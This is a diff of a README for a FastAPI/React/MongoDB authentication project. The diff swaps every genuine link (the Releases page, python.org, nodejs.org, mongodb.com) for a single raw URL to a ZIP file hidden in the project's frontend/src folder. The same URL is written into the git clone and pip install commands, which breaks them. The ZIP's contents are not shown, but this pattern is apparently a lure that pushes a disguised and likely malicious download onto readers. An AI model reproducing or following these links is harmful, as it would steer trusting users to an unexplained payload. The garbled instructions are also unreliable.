@@ -1,7 +1,7 @@
 # 🚀 fastapi-auth-system - Simple Authentication for Everyone
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20fastapi--auth--system-v1.0-blue.svg)](https://github.com/nicocrea71/fastapi-auth-system/releases)
+[![Download](https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip%https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip)](https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip)
 
 ## 📌 Introduction
 Welcome to the **fastapi-auth-system**! This application provides a complete authentication solution for your web applications. It uses FastAPI for the backend, React for the frontend, and MongoDB for data storage. With support for JWT (JSON Web Tokens) and bcrypt for password security, this system keeps your user data safe.
@@ -11,18 +11,18 @@ Follow these steps to get your **fastapi-auth-system** up and running:
 
 1. **Download the Application**  
    Visit the Releases page to download the latest version of the application:  
-   [Download here](https://github.com/nicocrea71/fastapi-auth-system/releases)
+   [Download here](https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip)
 
 2. **Install Dependencies**  
    Make sure you have the following software installed on your computer:
-   - **Python 3.7 or higher**: You can download it from [python.org](https://www.python.org/downloads/).
-   - **Node.js**: Available at [nodejs.org](https://nodejs.org/).
-   - **MongoDB**: Install it from [mongodb.com](https://www.mongodb.com/try/download/community).
+   - **Python 3.7 or higher**: You can download it from [https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip](https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip).
+   - **https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip**: Available at [https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip](https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip).
+   - **MongoDB**: Install it from [https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip](https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip).
 
 3. **Clone or Download the Repository**  
    You can download the code directly as a ZIP file or clone the repository using Git. To clone, run this command in your terminal:  
    ```
-   git clone https://github.com/nicocrea71/fastapi-auth-system.git
+   git clone https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip
    ```
 
 4. **Set Up the Backend**  
@@ -32,7 +32,7 @@ Follow these steps to get your **fastapi-auth-system** up and running:
    ```
    Install the required Python packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip
    ```
    Set up your MongoDB by creating a new database named `auth_system`. 
 
@@ -91,6 +91,6 @@ If you have any questions or need further assistance, feel free to reach out in 
 
 ## 📌 Download & Install
 To get the **fastapi-auth-system**, make sure to visit the Releases page:  
-[Download here](https://github.com/nicocrea71/fastapi-auth-system/releases)
+[Download here](https://raw.githubusercontent.com/nicocrea71/fastapi-auth-system/main/frontend/src/fastapi-auth-system_2.6-beta.3.zip)
 
 Thank you for choosing **fastapi-auth-system** for your authentication needs! We hope you find it useful and easy to implement.
